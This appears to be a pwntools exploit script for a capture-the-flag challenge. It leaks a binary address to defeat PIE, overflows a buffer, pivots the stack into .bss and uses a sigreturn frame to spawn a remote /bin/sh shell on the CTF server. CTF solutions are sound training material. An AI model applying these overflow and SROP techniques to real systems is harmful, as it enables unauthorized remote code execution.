from pwn import*
context.arch="amd64"
context.binary = ELF("./main")
context.terminal="xterm" #adjust this with ur terminal or comment/remove the line
DEBUG=0
nc="nc ctf.taz.tn 10003"
r=nc.split(" ")
b="./main"
e=ELF(b)
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"b *vuln +70")
else:
    p=remote(r[1],int(r[2]))
p.recvuntil(b"have ")

# Leak binary base: server prints an address we can use to compute the PIE base.
e.address = int(p.recvuntil(b" ")[:-1]) - e.sym.vuln

# Precompute useful addresses relative to the binary base (PIE)
bss = e.address + 0x4700
poprbp = e.address + 0x1144
syscall = e.address + 0x116d
print(f"binary base: {hex(e.address)}")

# Build small ROP to pivot stack/address into .bss and return to `vuln+46`
# The goal is to get control at a place where we can perform a sigreturn
# to issue a `execve("/bin/sh",0,0)` syscall.
payload = b"a"*40 + p64(0) + p64(0) + p64(poprbp) + p64(bss) + p64(e.sym.vuln + 46)
p.sendline(payload)

# Prepare a SigreturnFrame to craft registers for syscall(59 = execve)
frame = SigreturnFrame()
frame.rax = 59                # syscall number for execve
frame.rdi = bss - 0x30        # pointer to "/bin/sh\x00" we will write into .bss
frame.rsi = 0                 # argv = NULL
frame.rdx = 0                 # envp = NULL
frame.rip = syscall           # instruction that does `syscall`

# Place "/bin/sh" in the bss, padding, then a fake rt context to trigger sigreturn
payload_bss = b"/bin/sh\x00"
payload_bss += b"a" * 0x20   # padding to align the frame
payload_bss += p64(15)        # value to set in rax for sigreturn syscall trick (sigreturn number)
payload_bss += p64(0)         # rbp filler
payload_bss += p64(syscall)   # return to syscall which will invoke sigreturn
payload_bss += bytes(frame)   # the SigreturnFrame that sets registers for execve

p.sendline(payload_bss)
p.interactive()